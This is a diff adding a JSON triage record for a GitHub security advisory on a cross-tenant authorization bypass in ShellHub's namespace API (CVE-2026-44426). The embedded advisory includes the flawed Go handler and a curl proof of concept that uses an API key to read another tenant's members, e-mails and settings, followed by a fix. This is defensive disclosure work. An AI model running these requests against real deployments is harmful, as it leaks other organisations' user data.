@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/92599201?v=4\", \"events_url\": \"https://api.github.com/users/Edu0x01/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Edu0x01/followers\", \"following_url\": \"https://api.github.com/users/Edu0x01/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Edu0x01/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Edu0x01\", \"id\": 92599201, \"login\": \"Edu0x01\", \"node_id\": \"U_kgDOBYTzoQ\", \"organizations_url\": \"https://api.github.com/users/Edu0x01/orgs\", \"received_events_url\": \"https://api.github.com/users/Edu0x01/received_events\", \"repos_url\": \"https://api.github.com/users/Edu0x01/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Edu0x01/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Edu0x01/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Edu0x01\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44426\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"## Summary\\n`GET /api/namespaces/:tenant` returns the full namespace object — including the members list (user IDs, e-mails, roles), settings, and device counts — to any caller authenticated by an **API Key**, for any tenant, regardless of the API Key's own tenant scope.\\n\\nThe handler conditionally skips the membership check when the user ID (`X-ID`) is absent, which is exactly the case for API Key authentication.\\n\\n## Affected versions\\nShellHub Community v0.24.1 (validated).\\n\\n## Root cause\\n`api/routes/nsadm.go:75-102` — membership check is skipped when `c.ID()` is nil:\\n\\n  ```go\\n  var uid string\\n  if c.ID() != nil {\\n      uid = c.ID().ID\\n  }\\n\\n  ns, err := h.service.GetNamespace(c.Ctx(), req.Tenant)\\n  if err != nil || ns == nil {\\n      return c.NoContent(http.StatusNotFound)\\n  }\\n\\n  if uid != \\\"\\\" {                              // ⚠️ skipped when API Key is used\\n      if _, ok := ns.FindMember(uid); !ok {\\n          return c.NoContent(http.StatusForbidden)\\n      }\\n  }\\n\\n  return c.JSON(http.StatusOK, ns)\\n  ```\\n\\n  `AuthRequest` (`api/routes/auth.go:53-64`) sets only `X-Tenant-ID`, `X-Role`,\\n  and `X-API-KEY` for API Key authentication — never `X-ID`. So\\n  `c.Request().Header.Get(\\\"X-ID\\\")` returns `\\\"\\\"`, `c.ID()` returns `nil`, and\\n  the membership check is bypassed.\\n\\n## Proof of concept (validated live against v0.24.1)\\n\\n  ```bash\\n  # Attacker authenticates in their own namespace and mints an API Key\\n  ATTACKER_TOKEN=$(curl -s -X POST http://target/api/login \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    -d '{\\\"username\\\":\\\"attacker\\\",\\\"password\\\":\\\"...\\\"}' | jq -r .token)\\n\\n  ATTACKER_KEY=$(curl -s -X POST http://target/api/namespaces/api-key \\\\\\n    -H \\\"Authorization: Bearer $ATTACKER_TOKEN\\\" \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    -d '{\\\"name\\\":\\\"poc\\\",\\\"expires_at\\\":30}' | jq -r .id)\\n\\n  # Baseline: same request with JWT is correctly blocked\\n  curl -i http://target/api/namespaces/<victim-tenant-uuid> \\\\\\n    -H \\\"Authorization: Bearer $ATTACKER_TOKEN\\\"\\n  # Observed: HTTP 403 (correct)\\n\\n  # Exploit: same request with API Key returns full namespace\\n  curl -i http://target/api/namespaces/<victim-tenant-uuid> \\\\\\n    -H \\\"X-API-Key: $ATTACKER_KEY\\\"\\n  # Observed: HTTP 200 + {name, owner, tenant_id, members:[{id,email,role,added_at},...],\\n  #                      settings, max_devices, devices_accepted_count, type, created_at}\\n  ```\\n\\n## Impact\\n  - Enumeration of any ShellHub namespace by tenant UUID.\\n  - Disclosure of member e-mails, user IDs, and roles → user enumeration and targeted phishing against the victim organization.\\n  - Disclosure of namespace settings (session recording on/off, announcement text), device counts, namespace type, owner identity.\\n\\n## Suggested fix\\nTwo layers:\\n\\n  1. **Primary** — enforce caller-tenant match before returning the namespace, covering both JWT and API Key callers:\\n\\n     ```go\\n     // nsadm.go GetNamespace\\n     if c.Tenant() != nil && c.Tenant().ID != req.Tenant {\\n         return c.NoContent(http.StatusForbidden)\\n     }\\n     ```\", \"epss\": {\"percentage\": 0.00308, \"percentile\": 0.22502}, \"ghsa_id\": \"GHSA-vwx9-7qcf-gg7f\", \"github_reviewed_at\": \"2026-05-07T03:02:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-vwx9-7qcf-gg7f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vwx9-7qcf-gg7f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44426\"}], \"nvd_published_at\": \"2026-05-13T22:16:44Z\", \"published_at\": \"2026-05-07T03:02:28Z\", \"references\": [\"https://github.com/shellhub-io/shellhub/security/advisories/GHSA-vwx9-7qcf-gg7f\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44426\", \"https://github.com/advisories/GHSA-vwx9-7qcf-gg7f\"], \"repository_advisory_url\": \"https://api.github.com/repos/shellhub-io/shellhub/security-advisories/GHSA-vwx9-7qcf-gg7f\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/shellhub-io/shellhub\", \"summary\": \"ShellHub has cross-tenant IDOR in `GET /api/namespaces/:tenant` via API Key bypasses  membership check\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:43:27Z\", \"url\": \"https://api.github.com/advisories/GHSA-vwx9-7qcf-gg7f\", \"vulnerabilities\": [{\"first_patched_version\": \"0.24.2\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/shellhub-io/shellhub\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.24.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vwx9-7qcf-gg7f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/shellhub-io/shellhub: <= 0.24.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44426"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/shellhub-io/shellhub"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.260354Z",
+  "provenance": {
+    "content_sha256": "08ba0b1a1bd9b983bef5e5878c3592032968d6e606f8b8ad68e80f9d6de6cd8d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T03:02:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vwx9-7qcf-gg7f",
+  "status": "active",
+  "title": "ShellHub has cross-tenant IDOR in `GET /api/namespaces/:tenant` via API Key bypasses  membership check",
+  "updated_at": "2026-05-14T20:43:27Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vwx9-7qcf-gg7f"
+}
